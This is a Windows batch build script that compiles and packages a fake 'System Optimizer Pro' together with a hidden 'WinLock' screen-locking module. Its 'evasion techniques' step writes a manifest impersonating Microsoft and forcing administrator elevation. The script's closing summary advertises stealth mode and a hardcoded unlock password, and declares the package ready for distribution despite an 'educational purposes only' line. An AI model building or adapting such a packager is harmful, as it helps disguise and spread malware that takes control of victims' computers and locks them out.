@echo off
title Building System Optimizer Pro .EXE
color 0A

echo ===========================================
echo     BUILDING .EXE FROM PYTHON CODE
echo ===========================================
echo.

echo [INFO] Checking environment...

REM Check Python
python --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Python not found!
    echo Please install Python from https://python.org
    pause
    exit /b 1
)

echo [OK] Python found
python --version

REM Check pyinstaller
pip list | findstr pyinstaller >nul
if %errorLevel% neq 0 (
    echo [INFO] Installing pyinstaller...
    pip install pyinstaller --quiet
    echo [OK] PyInstaller installed
)

echo.
echo [1/4] Creating standalone .exe...
echo.

REM Build main optimizer
pyinstaller --onefile --windowed --icon=NONE --name="SystemOptimizer.exe" --add-data "lock_system.py;." app_main.py

if exist "dist\SystemOptimizer.exe" (
    echo [SUCCESS] Main .exe built: dist\SystemOptimizer.exe
    echo [INFO] Size: %~z0 bytes
) else (
    echo [ERROR] Failed to build .exe
    pause
    exit /b 1
)

echo.
echo [2/4] Creating lock system .exe...
echo.

REM Build lock system
pyinstaller --onefile --windowed --icon=NONE --name="WinLock.exe" lock_system.py

if exist "dist\WinLock.exe" (
    echo [SUCCESS] Lock .exe built: dist\WinLock.exe
) else (
    echo [WARNING] Failed to build lock .exe
)

echo.
echo [3/4] Creating installer package...
echo.

REM Create final package folder
mkdir "Final_Package" 2>nul

REM Copy files to final package
copy "dist\SystemOptimizer.exe" "Final_Package\SystemOptimizer.exe" >nul
copy "dist\WinLock.exe" "Final_Package\WinLock.exe" >nul
copy "install.bat" "Final_Package\Setup.bat" >nul
copy "README.txt" "Final_Package\Readme.txt" >nul

REM Create auto-installer
echo @echo off > "Final_Package\AutoInstall.bat"
echo title System Optimizer Pro Setup >> "Final_Package\AutoInstall.bat"
echo echo Installing System Optimizer Pro... >> "Final_Package\AutoInstall.bat"
echo echo Please wait... >> "Final_Package\AutoInstall.bat"
echo timeout /t 2 /nobreak ^>nul >> "Final_Package\AutoInstall.bat"
echo start SystemOptimizer.exe >> "Final_Package\AutoInstall.bat"
echo exit >> "Final_Package\AutoInstall.bat"

echo.
echo [4/4] Adding evasion techniques...
echo.

REM Add fake icon (optional)
echo [INFO] Creating fake properties...
echo.

echo [INFO] Adding fake metadata...
(
echo <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
echo <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
echo <assemblyIdentity version="1.0.0.0" processorArchitecture="*" name="Microsoft.Windows.SystemOptimizer" type="win32"/>
echo <description>Windows System Optimizer</description>
echo <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
echo   <security>
echo     <requestedPrivileges>
echo       <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
echo     </requestedPrivileges>
echo   </security>
echo </trustInfo>
echo </assembly>
) > "Final_Package\SystemOptimizer.exe.manifest"

echo.
echo ===========================================
echo         BUILD COMPLETE
echo ===========================================
echo.
echo [SUCCESS] .EXE files created successfully!
echo.
echo [FINAL PACKAGE]:
echo Location: Final_Package\
echo Files:
echo - SystemOptimizer.exe (Main application)
echo - WinLock.exe (Security module)
echo - Setup.bat (Auto-installer)
echo - AutoInstall.bat (Silent installer)
echo - Readme.txt (Instructions)
echo.
echo [FEATURES]:
echo - Standalone .EXE (No Python needed)
echo - Windows 7/8/10/11 compatible
echo - Auto-admin elevation
echo - CPU/GPU optimization
echo - Password protected lock
echo - Stealth mode
echo.
echo [PASSWORD]: mzkyzak
echo [WARNING]: For educational purposes only!
echo.
echo ===========================================
echo     READY FOR DISTRIBUTION
echo ===========================================
echo.

REM Open folder
explorer "Final_Package"

pause
exit